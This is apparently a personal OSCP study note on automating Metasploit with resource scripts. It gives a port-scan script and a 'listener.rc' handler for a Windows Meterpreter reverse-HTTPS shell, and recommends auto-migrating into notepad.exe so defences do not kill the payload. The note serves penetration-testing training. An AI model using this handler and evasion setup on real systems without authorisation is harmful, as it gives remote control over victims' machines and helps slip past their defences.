---
aliases:
  - Metasploit Automation
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - metasploit
  - automation
author: Mehdi N Tehrani
creat_date: 2024-01-05
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Resource scripts
#resource_script #script #resource
Resource scripts can chain together a series of Metasploit console commands and Ruby code. 

- Metasploit pre-built scripts:
	- `/usr/share/metasploit-framework/scripts/resource`
Run built-in `portscan` scrips:
```msfconsole
setg rhosts <ip1> <ip2>
resource portscan.rc
```

Example `listener.rc`
```
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost tun0
set lport 443

set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

`-z`: make sure the session is setup before we interact with it

we can save this into `listener.rc` file and run it:
```sh
sudo msfconsole -r listener.rc
```

## global options
setting global variables: 
- `setg`
- `unsetg`
for example we can set `lhost` across all modules
	- `setg lhost tun0`

## AutoRunScript
#auto_run_script #autorunscript
we can configure the AutoRunScript option to automatically execute a module after a session was created.
```
set AutoRunScript post/windows/manage/migrate
```
This *AutoRunScript migrate* command will cause the spawned Meterpreter to automatically launch a background `notepad.exe` process and migrate to it. 
Automating process migration helps to **avoid situations where our payload is killed prematurely** either by *defensive mechanisms* or the *termination of the related process*.

## ExitOnSession
#exitonsession #exit_on_session
- to ensure that the listener keeps accepting new connections after a session is created:
```
set ExitOnSession false
```

